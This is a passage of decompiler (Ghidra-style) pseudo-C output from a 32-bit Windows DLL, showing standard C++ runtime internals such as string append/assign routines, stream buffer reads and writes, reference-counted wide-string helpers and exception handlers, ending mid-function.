/* Function: FUN_1000ae70 */

void __thiscall FUN_1000ae70(undefined4 *param_1,int *param_2)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *param_2;
  if ((iVar1 != 0) && (*(int *)(iVar1 + 8) != 0)) {
    uVar2 = FUN_1000c1a0(iVar1 + 0xc,*(undefined4 *)(iVar1 + 8));
    *param_1 = uVar2;
  }
  return;
}



/* Function: FUN_1000aea0 */

short * __thiscall FUN_1000aea0(undefined4 *param_1,undefined4 *param_2)

{
  short *psVar1;
  int iVar2;
  int *piVar3;
  short *psVar4;
  
  psVar4 = (short *)*param_2;
  if ((psVar4 != (short *)0x0) && (*(int *)(psVar4 + 4) != 0)) {
    psVar1 = psVar4 + 4;
    psVar4 = psVar4 + 6;
    if ((psVar4 != (short *)0x0) && (*psVar4 != 0)) {
      psVar4 = (short *)FUN_1000c290(psVar4,*(undefined4 *)psVar1);
      *param_1 = psVar4;
      return psVar4;
    }
  }
  piVar3 = (int *)*param_1;
  if (piVar3 != (int *)0x0) {
    if (*piVar3 == 0) {
      piVar3[2] = 0;
      *(undefined1 *)(piVar3 + 3) = 0;
      *param_1 = piVar3;
      return psVar4;
    }
    LOCK();
    iVar2 = *piVar3;
    psVar4 = (short *)*piVar3;
    *piVar3 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      psVar4 = (short *)FUN_100579ee(piVar3);
    }
  }
  *param_1 = 0;
  return psVar4;
}



/* Function: FUN_1000af10 */

void __fastcall FUN_1000af10(int *param_1)

{
  if (*param_1 != 0) {
    FUN_100579ee(*param_1);
  }
  *param_1 = 0;
  return;
}



/* Function: FUN_1000af30 */

void __fastcall FUN_1000af30(int param_1)

{
  int iVar1;
  
  *(undefined ***)(*(int *)(*(int *)(param_1 + -0x18) + 4) + -0x18 + param_1) = &PTR_LAB_100835a4;
  iVar1 = *(int *)(*(int *)(param_1 + -0x18) + 4);
  *(int *)(iVar1 + -0x1c + param_1) = iVar1 + -0x18;
  return;
}



/* Function: FUN_1000af50 */

void __fastcall FUN_1000af50(ios_base *param_1)

{
  *(undefined ***)param_1 = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor(param_1);
  return;
}



/* Function: FUN_1000af60 */

undefined4 FUN_1000af60(void)

{
  return 0xffffffff;
}



/* Function: FUN_1000af70 */

undefined8 FUN_1000af70(void)

{
  return 0;
}



/* Function: FUN_1000af80 */

undefined4 FUN_1000af80(void)

{
  return 0xffffffff;
}



/* Function: uflow */

/* Library Function - Single Match
    protected: virtual int __thiscall std::basic_streambuf<char,struct std::char_traits<char>
   >::uflow(void)
   
   Library: Visual Studio 2019 Release */

int __thiscall
std::basic_streambuf<char,struct_std::char_traits<char>_>::uflow
          (basic_streambuf<char,struct_std::char_traits<char>_> *this)

{
  byte *pbVar1;
  int iVar2;
  
  iVar2 = (**(code **)(*(int *)this + 0x18))();
  if (iVar2 == -1) {
    return -1;
  }
  **(int **)(this + 0x2c) = **(int **)(this + 0x2c) + -1;
  pbVar1 = (byte *)**(int **)(this + 0x1c);
  **(int **)(this + 0x1c) = (int)(pbVar1 + 1);
  return (uint)*pbVar1;
}



/* Function: FUN_1000afc0 */

/* WARNING: Removing unreachable block (ram,0x1000b014) */
/* WARNING: Removing unreachable block (ram,0x1000b01e) */

longlong __thiscall FUN_1000afc0(int *param_1,undefined1 *param_2,uint param_3,int param_4)

{
  longlong lVar1;
  int iVar2;
  uint uVar3;
  bool bVar4;
  longlong lVar5;
  
  if ((-1 < param_4) && ((0 < param_4 || (param_3 != 0)))) {
    lVar1 = 0;
    while( true ) {
      do {
        lVar5 = FUN_1000b710();
        if (lVar5 < 1) {
          iVar2 = (**(code **)(*param_1 + 0x1c))();
          if (iVar2 == -1) {
            return lVar1;
          }
          *param_2 = (char)iVar2;
          param_2 = param_2 + 1;
          lVar1 = lVar1 + 1;
          bVar4 = param_3 != 0;
          param_3 = param_3 - 1;
          param_4 = param_4 + -1 + (uint)bVar4;
        }
        else {
          if (CONCAT44(param_4,param_3) < lVar5) {
            lVar5 = CONCAT44(param_4,param_3);
          }
          uVar3 = (uint)lVar5;
          if (uVar3 != 0) {
            FUN_1005d740(param_2,*(undefined4 *)param_1[7],uVar3);
          }
          param_2 = param_2 + uVar3;
          lVar1 = lVar5 + lVar1;
          bVar4 = param_3 < uVar3;
          param_3 = param_3 - uVar3;
          param_4 = (param_4 - (int)((ulonglong)lVar5 >> 0x20)) - (uint)bVar4;
          *(int *)param_1[0xb] = *(int *)param_1[0xb] - uVar3;
          *(int *)param_1[7] = *(int *)param_1[7] + uVar3;
        }
      } while (0 < param_4);
      if (param_4 < 0) break;
      if (param_3 == 0) {
        return lVar1;
      }
    }
    return lVar1;
  }
  return 0;
}



/* Function: FUN_1000b0d0 */

/* WARNING: Removing unreachable block (ram,0x1000b124) */
/* WARNING: Removing unreachable block (ram,0x1000b12e) */

longlong __thiscall FUN_1000b0d0(int *param_1,undefined1 *param_2,uint param_3,int param_4)

{
  longlong lVar1;
  int iVar2;
  uint uVar3;
  bool bVar4;
  longlong lVar5;
  
  if ((-1 < param_4) && ((0 < param_4 || (param_3 != 0)))) {
    lVar1 = 0;
    while( true ) {
      do {
        lVar5 = FUN_1000b730();
        if (lVar5 < 1) {
          iVar2 = (**(code **)(*param_1 + 0xc))(*param_2);
          if (iVar2 == -1) {
            return lVar1;
          }
          param_2 = param_2 + 1;
          lVar1 = lVar1 + 1;
          bVar4 = param_3 != 0;
          param_3 = param_3 - 1;
          param_4 = param_4 + -1 + (uint)bVar4;
        }
        else {
          if (CONCAT44(param_4,param_3) < lVar5) {
            lVar5 = CONCAT44(param_4,param_3);
          }
          uVar3 = (uint)lVar5;
          if (uVar3 != 0) {
            FUN_1005d740(*(undefined4 *)param_1[8],param_2,uVar3);
          }
          param_2 = param_2 + uVar3;
          lVar1 = lVar5 + lVar1;
          bVar4 = param_3 < uVar3;
          param_3 = param_3 - uVar3;
          param_4 = (param_4 - (int)((ulonglong)lVar5 >> 0x20)) - (uint)bVar4;
          *(int *)param_1[0xc] = *(int *)param_1[0xc] - uVar3;
          *(int *)param_1[8] = *(int *)param_1[8] + uVar3;
        }
      } while (0 < param_4);
      if (param_4 < 0) break;
      if (param_3 == 0) {
        return lVar1;
      }
    }
    return lVar1;
  }
  return 0;
}



/* Function: FUN_1000b1e0 */

void FUN_1000b1e0(undefined4 *param_1)

{
  *param_1 = DAT_1007a4f8;
  param_1[1] = DAT_1007a4fc;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  return;
}



/* Function: FUN_1000b210 */

void FUN_1000b210(undefined4 *param_1)

{
  *param_1 = DAT_1007a4f8;
  param_1[1] = DAT_1007a4fc;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  return;
}



/* Function: FUN_1000b240 */

undefined4 __fastcall FUN_1000b240(undefined4 param_1)

{
  return param_1;
}



/* Function: Manifest */

undefined4 Manifest(void)

{
                    /* 0xb250  9  Manifest */
  return 0;
}



/* Function: thunk_FUN_1000b750 */

void thunk_FUN_1000b750(void)

{
  FUN_1000b750();
  return;
}



/* Function: FUN_1000b270 */

ios_base * __thiscall FUN_1000b270(ios_base *param_1,byte param_2)

{
  ios_base *piVar1;
  
  piVar1 = param_1 + -0x18;
  *(undefined ***)(param_1 + *(int *)(*(int *)piVar1 + 4) + -0x18) = &PTR_LAB_100835a4;
  *(int *)(param_1 + *(int *)(*(int *)(param_1 + -0x18) + 4) + -0x1c) =
       *(int *)(*(int *)(param_1 + -0x18) + 4) + -0x18;
  *(undefined ***)param_1 = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor(param_1);
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(piVar1);
  }
  return piVar1;
}



/* Function: FUN_1000b2c0 */

undefined4 * __thiscall FUN_1000b2c0(undefined4 *param_1,byte param_2)

{
  int *piVar1;
  undefined4 *puVar2;
  
  piVar1 = (int *)param_1[0xd];
  *param_1 = std::basic_streambuf<char,struct_std::char_traits<char>_>::vftable;
  if (piVar1 != (int *)0x0) {
    if ((int *)*piVar1 != (int *)0x0) {
      puVar2 = (undefined4 *)(**(code **)(*(int *)*piVar1 + 8))();
      if (puVar2 != (undefined4 *)0x0) {
        (**(code **)*puVar2)(1);
      }
    }
    thunk_FUN_100579ee(piVar1);
  }
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_1000b310 */

int * __thiscall FUN_1000b310(int *param_1,undefined4 *param_2,uint param_3,uint param_4)

{
  code *pcVar1;
  char cVar2;
  uint uVar3;
  int *piVar4;
  int iVar5;
  
  if ((uint)param_2[4] < param_3) {
    FUN_10056a98("invalid string position");
  }
  else {
    uVar3 = param_2[4] - param_3;
    iVar5 = param_1[4];
    if (uVar3 < param_4) {
      param_4 = uVar3;
    }
    if (param_4 < -iVar5 - 1U) {
      if ((param_4 != 0) && (cVar2 = FUN_1000b950(iVar5 + param_4,0), cVar2 != '\0')) {
        if (0xf < (uint)param_2[5]) {
          param_2 = (undefined4 *)*param_2;
        }
        piVar4 = param_1;
        if (0xf < (uint)param_1[5]) {
          piVar4 = (int *)*param_1;
        }
        if (param_4 != 0) {
          FUN_1005d740(param_1[4] + (int)piVar4,param_3 + (int)param_2,param_4);
        }
        iVar5 = iVar5 + param_4;
        param_1[4] = iVar5;
        if (0xf < (uint)param_1[5]) {
          *(undefined1 *)(*param_1 + iVar5) = 0;
          return param_1;
        }
        *(undefined1 *)((int)param_1 + iVar5) = 0;
      }
      return param_1;
    }
  }
  FUN_10056a6a("string too long");
  pcVar1 = (code *)swi(3);
  piVar4 = (int *)(*pcVar1)();
  return piVar4;
}



/* Function: FUN_1000b3d0 */

int * __thiscall FUN_1000b3d0(int *param_1,int *param_2,uint param_3)

{
  uint uVar1;
  code *pcVar2;
  char cVar3;
  int *piVar4;
  int iVar5;
  
  if (param_2 != (int *)0x0) {
    uVar1 = param_1[5];
    piVar4 = param_1;
    if (0xf < uVar1) {
      piVar4 = (int *)*param_1;
    }
    if (piVar4 <= param_2) {
      piVar4 = param_1;
      if (0xf < uVar1) {
        piVar4 = (int *)*param_1;
      }
      if (param_2 < (int *)(param_1[4] + (int)piVar4)) {
        if (uVar1 < 0x10) {
          piVar4 = (int *)FUN_1000b310(param_1,(int)param_2 - (int)param_1,param_3);
          return piVar4;
        }
        piVar4 = (int *)FUN_1000b310(param_1,(int)param_2 - *param_1,param_3);
        return piVar4;
      }
    }
  }
  iVar5 = param_1[4];
  if (-iVar5 - 1U <= param_3) {
    FUN_10056a6a("string too long");
    pcVar2 = (code *)swi(3);
    piVar4 = (int *)(*pcVar2)();
    return piVar4;
  }
  if ((param_3 != 0) && (cVar3 = FUN_1000b950(iVar5 + param_3,0), cVar3 != '\0')) {
    piVar4 = param_1;
    if (0xf < (uint)param_1[5]) {
      piVar4 = (int *)*param_1;
    }
    if (param_3 != 0) {
      FUN_1005d740(param_1[4] + (int)piVar4,param_2,param_3);
    }
    iVar5 = iVar5 + param_3;
    param_1[4] = iVar5;
    if (0xf < (uint)param_1[5]) {
      *(undefined1 *)(*param_1 + iVar5) = 0;
      return param_1;
    }
    *(undefined1 *)((int)param_1 + iVar5) = 0;
  }
  return param_1;
}



/* Function: FUN_1000b4c0 */

int * __thiscall FUN_1000b4c0(int *param_1,int *param_2,uint param_3,uint param_4)

{
  code *pcVar1;
  int *piVar2;
  uint uVar3;
  
  if ((uint)param_2[4] < param_3) {
    FUN_10056a98("invalid string position");
  }
  else {
    uVar3 = param_2[4] - param_3;
    if (param_4 < uVar3) {
      uVar3 = param_4;
    }
    if (param_1 != param_2) {
      if (uVar3 != 0xffffffff) {
        if ((uint)param_1[5] < uVar3) {
          FUN_1000bb20(uVar3,param_1[4]);
          if (uVar3 == 0) {
            return param_1;
          }
        }
        else if (uVar3 == 0) {
          param_1[4] = 0;
          if (0xf < (uint)param_1[5]) {
            *(undefined1 *)*param_1 = 0;
            return param_1;
          }
          *(undefined1 *)param_1 = 0;
          return param_1;
        }
        if (0xf < (uint)param_2[5]) {
          param_2 = (int *)*param_2;
        }
        piVar2 = param_1;
        if (0xf < (uint)param_1[5]) {
          piVar2 = (int *)*param_1;
        }
        if (uVar3 != 0) {
          FUN_1005d740(piVar2,(int)param_2 + param_3,uVar3);
        }
        param_1[4] = uVar3;
        if ((uint)param_1[5] < 0x10) {
          *(undefined1 *)((int)param_1 + uVar3) = 0;
          return param_1;
        }
        *(undefined1 *)(*param_1 + uVar3) = 0;
        return param_1;
      }
      goto LAB_1000b5d6;
    }
    uVar3 = uVar3 + param_3;
    if (uVar3 <= (uint)param_1[4]) {
      param_1[4] = uVar3;
      if (0xf < (uint)param_1[5]) {
        *(undefined1 *)(*param_1 + uVar3) = 0;
        FUN_1000b8b0(0,param_3);
        return param_1;
      }
      *(undefined1 *)((int)param_1 + uVar3) = 0;
      FUN_1000b8b0(0,param_3);
      return param_1;
    }
  }
  FUN_10056a98("invalid string position");
LAB_1000b5d6:
  FUN_10056a6a("string too long");
  pcVar1 = (code *)swi(3);
  piVar2 = (int *)(*pcVar1)();
  return piVar2;
}



/* Function: FUN_1000b5f0 */

bool __fastcall FUN_1000b5f0(int *param_1)

{
  if (*param_1 != 0) {
    return *(int *)(*param_1 + 8) == 0;
  }
  return true;
}



/* Function: FUN_1000b610 */

void __fastcall FUN_1000b610(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    if (*piVar2 == 0) {
      piVar2[2] = 0;
      *(undefined2 *)(piVar2 + 3) = 0;
      *param_1 = piVar2;
      return;
    }
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  *param_1 = 0;
  return;
}



/* Function: FUN_1000b650 */

void __thiscall FUN_1000b650(int param_1,int *param_2)

{
  undefined1 uVar1;
  undefined4 uVar2;
  int *piVar3;
  undefined4 *puVar4;
  uint uVar5;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074508;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_10008ce0(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  *(int **)(param_1 + 0x38) = param_2;
  *(undefined4 *)(param_1 + 0x3c) = 0;
  uVar2 = FUN_10008cc0(&param_2);
  local_8 = 0;
  piVar3 = (int *)FUN_1000c390(uVar2);
  local_8 = 0xffffffff;
  if (param_2 != (int *)0x0) {
    puVar4 = (undefined4 *)(**(code **)(*param_2 + 8))();
    if (puVar4 != (undefined4 *)0x0) {
      (**(code **)*puVar4)(1);
    }
  }
  uVar1 = (**(code **)(*piVar3 + 0x20))(0x20);
  *(undefined1 *)(param_1 + 0x40) = uVar1;
  if ((*(int *)(param_1 + 0x38) == 0) &&
     (uVar5 = *(uint *)(param_1 + 0xc) & 0x17 | 4, *(uint *)(param_1 + 0xc) = uVar5,
     (*(uint *)(param_1 + 0x10) & uVar5) != 0)) {
    FUN_10008c40();
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1000b710 */

void __fastcall FUN_1000b710(int param_1)

{
  if (**(int **)(param_1 + 0x1c) != 0) {
    return;
  }
  return;
}



/* Function: FUN_1000b730 */

void __fastcall FUN_1000b730(int param_1)

{
  if (**(int **)(param_1 + 0x20) != 0) {
    return;
  }
  return;
}



/* Function: FUN_1000b750 */

void __fastcall FUN_1000b750(undefined4 *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  int *piVar3;
  undefined4 *puVar4;
  
  puVar4 = (undefined4 *)*param_1;
  if (puVar4 != (undefined4 *)0x0) {
    puVar2 = (undefined4 *)param_1[1];
    for (; puVar4 != puVar2; puVar4 = puVar4 + 1) {
      piVar3 = (int *)*puVar4;
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar3;
        *piVar3 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
    }
    thunk_FUN_100579ee(*param_1);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* Function: FUN_1000b7b0 */

int * __thiscall FUN_1000b7b0(int *param_1,int *param_2,uint param_3)

{
  uint uVar1;
  code *pcVar2;
  int *piVar3;
  
  if (param_2 != (int *)0x0) {
    uVar1 = param_1[5];
    piVar3 = param_1;
    if (0xf < uVar1) {
      piVar3 = (int *)*param_1;
    }
    if (piVar3 <= param_2) {
      piVar3 = param_1;
      if (0xf < uVar1) {
        piVar3 = (int *)*param_1;
      }
      if (param_2 < (int *)(param_1[4] + (int)piVar3)) {
        if (0xf < uVar1) {
          piVar3 = (int *)FUN_1000b4c0(param_1,(int)param_2 - *param_1,param_3);
          return piVar3;
        }
        piVar3 = (int *)FUN_1000b4c0(param_1,(int)param_2 - (int)param_1,param_3);
        return piVar3;
      }
    }
  }
  if (param_3 == 0xffffffff) {
    FUN_10056a6a("string too long");
    pcVar2 = (code *)swi(3);
    piVar3 = (int *)(*pcVar2)();
    return piVar3;
  }
  if ((uint)param_1[5] < param_3) {
    FUN_1000bb20(param_3,param_1[4]);
    if (param_3 == 0) {
      return param_1;
    }
  }
  else if (param_3 == 0) {
    param_1[4] = 0;
    if (0xf < (uint)param_1[5]) {
      *(undefined1 *)*param_1 = 0;
      return param_1;
    }
    *(undefined1 *)param_1 = 0;
    return param_1;
  }
  piVar3 = param_1;
  if (0xf < (uint)param_1[5]) {
    piVar3 = (int *)*param_1;
  }
  if (param_3 != 0) {
    FUN_1005d740(piVar3,param_2,param_3);
  }
  param_1[4] = param_3;
  if ((uint)param_1[5] < 0x10) {
    *(undefined1 *)((int)param_1 + param_3) = 0;
    return param_1;
  }
  *(undefined1 *)(*param_1 + param_3) = 0;
  return param_1;
}



/* Function: FUN_1000b8b0 */

int * __thiscall FUN_1000b8b0(int *param_1,uint param_2,uint param_3)

{
  uint uVar1;
  code *pcVar2;
  int *piVar3;
  int iVar4;
  
  uVar1 = param_1[4];
  if (uVar1 < param_2) {
    FUN_10056a98("invalid string position");
    pcVar2 = (code *)swi(3);
    piVar3 = (int *)(*pcVar2)();
    return piVar3;
  }
  if (param_3 < uVar1 - param_2) {
    if (param_3 != 0) {
      piVar3 = param_1;
      if (0xf < (uint)param_1[5]) {
        piVar3 = (int *)*param_1;
      }
      iVar4 = uVar1 - param_3;
      if (iVar4 - param_2 != 0) {
        FUN_10057b70((int)piVar3 + param_2,(int)piVar3 + param_2 + param_3,iVar4 - param_2);
      }
      param_1[4] = iVar4;
      if (0xf < (uint)param_1[5]) {
        *(undefined1 *)(*param_1 + iVar4) = 0;
        return param_1;
      }
      *(undefined1 *)((int)param_1 + iVar4) = 0;
    }
    return param_1;
  }
  param_1[4] = param_2;
  if ((uint)param_1[5] < 0x10) {
    *(undefined1 *)((int)param_1 + param_2) = 0;
    return param_1;
  }
  *(undefined1 *)(*param_1 + param_2) = 0;
  return param_1;
}



/* Function: FUN_1000b950 */

uint __thiscall FUN_1000b950(undefined4 *param_1,uint param_2,char param_3)

{
  undefined4 uVar1;
  code *pcVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_2 == 0xffffffff) {
    FUN_10056a6a("string too long");
    pcVar2 = (code *)swi(3);
    uVar3 = (*pcVar2)();
    return uVar3;
  }
  uVar3 = param_1[5];
  if (uVar3 < param_2) {
    FUN_1000bb20(param_2,param_1[4]);
    return (uint)(param_2 != 0);
  }
  if ((param_3 != '\0') && (param_2 < 0x10)) {
    uVar4 = param_1[4];
    if (param_2 < (uint)param_1[4]) {
      uVar4 = param_2;
    }
    if (0xf < uVar3) {
      uVar1 = *param_1;
      if (uVar4 != 0) {
        FUN_1005d740(param_1,uVar1,uVar4);
      }
      thunk_FUN_100579ee(uVar1);
    }
    param_1[4] = uVar4;
    param_1[5] = 0xf;
    *(undefined1 *)(uVar4 + (int)param_1) = 0;
    return (uint)(param_2 != 0);
  }
  if (param_2 == 0) {
    param_1[4] = 0;
    if (0xf < uVar3) {
      param_1 = (undefined4 *)*param_1;
    }
    *(undefined1 *)param_1 = 0;
  }
  return (uint)(param_2 != 0);
}



/* Function: FUN_1000ba10 */

void __fastcall FUN_1000ba10(int *param_1)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  int *piVar4;
  
  piVar2 = (int *)*param_1;
  piVar4 = (int *)*piVar2;
  *piVar2 = (int)piVar2;
  *(int *)(*param_1 + 4) = *param_1;
  param_1[1] = 0;
  if (piVar4 != (int *)*param_1) {
    do {
      piVar2 = (int *)piVar4[2];
      piVar3 = (int *)*piVar4;
      if (piVar2 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar2;
        *piVar2 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(piVar2);
        }
      }
      thunk_FUN_100579ee(piVar4);
      piVar4 = piVar3;
    } while (piVar3 != (int *)*param_1);
  }
  return;
}



/* Function: FUN_1000ba60 */

int * FUN_1000ba60(void)

{
  if ((DAT_1009acdc & 1) == 0) {
    DAT_1009acdc = DAT_1009acdc | 1;
    DAT_1009acd8 = (int *)FUN_1000bd10(0);
    if (DAT_1009acd8 != (int *)0x0) {
      DAT_1009acd8[2] = 0;
      *(undefined2 *)(DAT_1009acd8 + 3) = 0;
    }
    FUN_10057b51(&LAB_10078350);
  }
  if (DAT_1009acd8 != (int *)0x0) {
    LOCK();
    *DAT_1009acd8 = *DAT_1009acd8 + 1;
    UNLOCK();
    return DAT_1009acd8;
  }
  return (int *)0x0;
}



/* Function: FUN_1000bad0 */

void __thiscall FUN_1000bad0(undefined4 *param_1,int param_2,int param_3,char param_4)

{
  if (param_3 == 1) {
    if (0xf < (uint)param_1[5]) {
      param_1 = (undefined4 *)*param_1;
    }
    *(char *)((int)param_1 + param_2) = param_4;
    return;
  }
  if (0xf < (uint)param_1[5]) {
    param_1 = (undefined4 *)*param_1;
  }
  FUN_1005ff60(param_2 + (int)param_1,(int)param_4,param_3);
  return;
}



/* Function: FUN_1000bb20 */

undefined4 * __thiscall FUN_1000bb20(undefined4 *param_1,uint param_2,int param_3)

{
  uint uVar1;
  uint uVar2;
  undefined4 *puVar3;
  uint uVar4;
  uint uVar5;
  undefined4 *local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074530;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  uVar4 = param_2 | 0xf;
  uVar5 = param_2;
  if (uVar4 != 0xffffffff) {
    uVar1 = param_1[5];
    uVar2 = uVar1 >> 1;
    uVar5 = uVar4;
    if ((uVar4 / 3 < uVar2) && (uVar5 = uVar2 + uVar1, -uVar2 - 2 < uVar1)) {
      uVar5 = 0xfffffffe;
    }
  }
  local_8 = 0;
  local_18 = (undefined4 *)0x0;
  if ((uVar5 + 1 != 0) &&
     (local_18 = (undefined4 *)FUN_100582fa(uVar5 + 1), local_18 == (undefined4 *)0x0)) {
    FUN_10056a39();
    local_8 = CONCAT31(local_8._1_3_,2);
    FUN_1000bc70(param_2 + 1);
    return (undefined4 *)&DAT_1000bbd5;
  }
  if (param_3 != 0) {
    puVar3 = param_1;
    if (0xf < (uint)param_1[5]) {
      puVar3 = (undefined4 *)*param_1;
    }
    if (param_3 != 0) {
      FUN_1005d740(local_18,puVar3,param_3);
    }
  }
  if (0xf < (uint)param_1[5]) {
    thunk_FUN_100579ee(*param_1);
  }
  *(undefined1 *)param_1 = 0;
  *param_1 = local_18;
  param_1[5] = uVar5;
  param_1[4] = param_3;
  if (0xf < uVar5) {
    param_1 = local_18;
  }
  *(undefined1 *)((int)param_1 + param_3) = 0;
  ExceptionList = local_10;
  return local_18;
}



/* Function: Catch_All@1000bbb5 */

undefined * Catch_All_1000bbb5(void)

{
  undefined4 uVar1;
  int unaff_EBP;
  
  *(int *)(unaff_EBP + -0x14) = *(int *)(unaff_EBP + 8);
  *(BADSPACEBASE **)(unaff_EBP + -0x10) = register0x00000010;
  *(undefined1 *)(unaff_EBP + -4) = 2;
  uVar1 = FUN_1000bc70(*(int *)(unaff_EBP + 8) + 1);
  *(undefined4 *)(unaff_EBP + 8) = uVar1;
  return &DAT_1000bbd5;
}



/* Function: Catch_All@1000bbf2 */

void Catch_All_1000bbf2(void)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  int unaff_EBX;
  int unaff_EBP;
  undefined4 *puVar3;
  uint unaff_EDI;
  
  puVar3 = *(undefined4 **)(unaff_EBP + -0x18);
  if (0xf < (uint)puVar3[5]) {
    thunk_FUN_100579ee(*puVar3);
  }
  puVar3[5] = 0xf;
  puVar3[4] = 0;
  *(undefined1 *)puVar3 = 0;
  uVar2 = FUN_1005de1b(0,0);
  if (unaff_EBX != 0) {
    FUN_1005d740(uVar2,puVar3);
  }
  if (0xf < (uint)puVar3[5]) {
    thunk_FUN_100579ee(*puVar3);
  }
  puVar1 = *(undefined4 **)(unaff_EBP + -0x14);
  *(undefined1 *)puVar3 = 0;
  *puVar3 = puVar1;
  puVar3[5] = unaff_EDI;
  puVar3[4] = unaff_EBX;
  if (0xf < unaff_EDI) {
    puVar3 = puVar1;
  }
  *(undefined1 *)((int)puVar3 + unaff_EBX) = 0;
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



/* Function: FUN_1000bc70 */

int FUN_1000bc70(int param_1)

{
  code *pcVar1;
  int iVar2;
  
  iVar2 = 0;
  if ((param_1 != 0) && (iVar2 = FUN_100582fa(param_1), iVar2 == 0)) {
    FUN_10056a39();
    pcVar1 = (code *)swi(3);
    iVar2 = (*pcVar1)();
    return iVar2;
  }
  return iVar2;
}



/* Function: FUN_1000bca0 */

void __thiscall FUN_1000bca0(int param_1,uint param_2)

{
  short sVar1;
  short *psVar2;
  int iVar3;
  uint uVar4;
  
  if (param_1 != 0) {
    if (param_2 == 0xffffffff) {
      psVar2 = (short *)(param_1 + 0xc);
      if (psVar2 != (short *)0x0) {
        do {
          sVar1 = *psVar2;
          psVar2 = psVar2 + 1;
        } while (sVar1 != 0);
        iVar3 = (int)psVar2 - (param_1 + 0xe) >> 1;
        *(int *)(param_1 + 8) = iVar3;
        *(undefined2 *)(param_1 + 0xc + iVar3 * 2) = 0;
        return;
      }
      *(undefined4 *)(param_1 + 8) = 0;
      *(undefined2 *)(param_1 + 0xc) = 0;
      return;
    }
    uVar4 = *(int *)(param_1 + 4) - 1;
    if (uVar4 <= param_2) {
      param_2 = uVar4;
    }
    *(uint *)(param_1 + 8) = param_2;
    *(undefined2 *)(param_1 + 0xc + param_2 * 2) = 0;
  }
  return;
}



/* Function: FUN_1000bd10 */

undefined4 * __fastcall FUN_1000bd10(short *param_1,int param_2)

{
  short sVar1;
  uint uVar2;
  undefined4 *puVar3;
  short *psVar4;
  
  if (param_2 == -1) {
    if (param_1 == (short *)0x0) {
      return (undefined4 *)0x0;
    }
    psVar4 = param_1;
    do {
      sVar1 = *psVar4;
      psVar4 = psVar4 + 1;
    } while (sVar1 != 0);
    param_2 = (int)psVar4 - (int)(param_1 + 1) >> 1;
  }
  if (param_2 == 0) {
    return (undefined4 *)0x0;
  }
  uVar2 = 0x10;
  if (0x10 < param_2 + 1U) {
    uVar2 = param_2 + 1U;
  }
  uVar2 = uVar2 + 0xf & 0xfffffff0;
  puVar3 = (undefined4 *)FUN_100581b4(uVar2 * 2 + 0xe);
  if (puVar3 != (undefined4 *)0x0) {
    puVar3[1] = uVar2;
    *puVar3 = 0;
    if (param_1 == (short *)0x0) {
      puVar3[2] = 0;
      *(undefined2 *)((int)puVar3 + puVar3[2] * 2 + 0xc) = 0;
      return puVar3;
    }
    puVar3[2] = param_2;
    FUN_1005d740(puVar3 + 3,param_1,param_2 * 2);
    *(undefined2 *)((int)puVar3 + puVar3[2] * 2 + 0xc) = 0;
    return puVar3;
  }
  return (undefined4 *)0x0;
}



/* Function: FUN_1000bdd0 */

int * __thiscall FUN_1000bdd0(int *param_1,int *param_2)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  int local_10;
  int local_c;
  char local_5;
  
  if (((param_1 == (int *)0x0) || (param_2 < param_1 + 3)) ||
     ((int *)((int)param_1 + (param_1[1] + 6) * 2) <= param_2)) {
    local_5 = '\0';
  }
  else {
    local_5 = '\x01';
  }
  if (param_2 == (int *)0x0) {
    iVar3 = 0;
  }
  else {
    piVar2 = param_2;
    do {
      iVar3 = *piVar2;
      piVar2 = (int *)((int)piVar2 + 2);
    } while ((short)iVar3 != 0);
    iVar3 = (int)piVar2 - ((int)param_2 + 2) >> 1;
  }
  local_c = iVar3;
  if (((param_1 == (int *)0x0) || (*param_1 == 0)) && (iVar3 != 0)) {
    if (local_5 != '\0') {
      local_10 = (int)param_2 + (-0xc - (int)param_1) >> 1;
      FUN_10007380(&local_10,&local_c);
      iVar3 = local_c;
      if (local_c != 0) {
        FUN_10057b70(param_1 + 3,param_2,local_c * 2);
      }
      param_1[2] = iVar3;
      *(undefined2 *)((int)param_1 + iVar3 * 2 + 0xc) = 0;
      return param_1;
    }
  }
  else if ((local_5 != '\0') && (param_1 != (int *)0x0)) {
    LOCK();
    *param_1 = *param_1 + 1;
    UNLOCK();
  }
  if (iVar3 == 0) {
    uVar4 = 0;
  }
  else {
    uVar4 = iVar3 + 1;
  }
  if ((param_1 == (int *)0x0) || (*param_1 == 0)) {
    piVar2 = (int *)FUN_10010290(uVar4);
  }
  else {
    if (uVar4 < 0x10000) {
      uVar5 = 0x10;
      if (0x10 < uVar4) {
        uVar5 = uVar4;
      }
